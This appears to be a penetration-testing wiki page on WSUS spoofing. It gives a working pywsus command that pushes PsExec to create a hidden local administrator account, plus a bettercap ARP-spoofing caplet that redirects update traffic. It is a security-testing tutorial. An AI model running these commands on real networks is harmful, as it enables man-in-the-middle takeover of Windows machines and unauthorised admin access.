---
authors: ShutdownRepo
category: ad
---

# WSUS spoofing

## Theory

WSUS (Windows Server Update Services) allow administrators to centralize the management and deployment of Windows updates within their organization network. When first configuring this set of services, the default configuration makes the WSUS use HTTP without any secure layer like SSL/TLS. HTTPS is not enforced by default.

When pulling an update from the WSUS server, clients are redirected to the executable file to download and execute (which can only be a binary signed by Microsoft) and obtain a handler named `CommandLineInstallation` that specifies the additional parameters to pass the binary during the update installation. Without HTTPS, the WSUS is vulnerable to Man-in-the-Middle attacks where adversaries can either pose as the update server and send malicious updates or intercept and modify updates sent to the clients.

## Practice

The following command prints the WSUS server the client requests when searching for an update. If the path looks like `http://wsus.domain.local/`, showing the use of HTTP instead of HTTPS, the attacks can be attempted.

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver
```

The WSUS spoofing attack can be conducted as follows

1. Obtain a Man-in-the-Middle position between clients and the update server with [ARP poisoning](arp-poisoning.md).
2. Redirect traffic from `clients -> legitimate WSUS` to `clients -> attacker's WSUS`
3. Have a custom WSUS server running able to send evil updates to clients

In a scenario where the clients and the attacker are on the same subnet, and the update server is on another one, the steps below can be followed. For other scenarios or more info on ARP poisoning, a recipe exists for it.

> [!TIP]
> Read the [arp-poisoning.md](arp-poisoning.md) article for more insight


### Preparing the evil WSUS

The evil WSUS server needs to be started before doing any ARP poisoning. The [pywsus ](https://github.com/GoSecure/pywsus)(Python) utility can be used for that matter.

```bash
python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser somepassword /add && net localgroup Administrators testuser /add"'
```

Programs other than PsExec.exe can be used here. Using built-in programs features to bypass security restrictions or operate attacks like this is called [Living off the land](../../../infra/privilege-escalation/windows/living-off-the-land) (LOL). Other Windows LOL binaries and scripts (a.k.a. LOLbins or LOLbas) can be found on [lolbas-project.github.io](https://lolbas-project.github.io).

### Poisoning and hijacking

Once the WSUS server is up and running, the ARP poisoning attack can start. The best tool to operate ARP poisoning is [bettercap](https://www.bettercap.org/) (Go) and for the majority of the scenarios, basic knowledge of the iptables utility is required.

Packets from the client to the WSUS server need to be hijacked and sent to the attacker's evil WSUS server. In order to do so, the attacker must pose as the client's gateway, route all traffic to the real gateway except the packets destined to the WSUS server.


```bash
# quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the WSUS server
set any.proxy.iface $interface
set any.proxy.protocol TCP
set any.proxy.src_address $WSUS_server_ip
set any.proxy.src_port 8530
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 8530

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff

# start the modules
any.proxy on
arp.spoof on
net.sniff on
```


The caplet above can be loaded with the following command in order to launch the ARP poisoning attack.

```bash
bettercap --iface $interface --caplet wsus_spoofing.cap
```

### Triggering Windows update

The search for Windows updates can be manually triggered when having access to the target computer by going to `Settings > Update & Security > Windows Update > Check for updates`. 

> [!TIP]
> By default, the automatic updates interval is 22 hours ([source](https://docs.microsoft.com/en-us/windows/deployment/update/waas-wu-settings)).

## Alternative attack

Another way of attacking insecure WSUS without having to rely on ARP poisoning but requiring user access to the target machine is explained in the following blogpost : [WSUS Attacks Part 2: CVE-2020-1013 a Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)

## Resources

[https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/)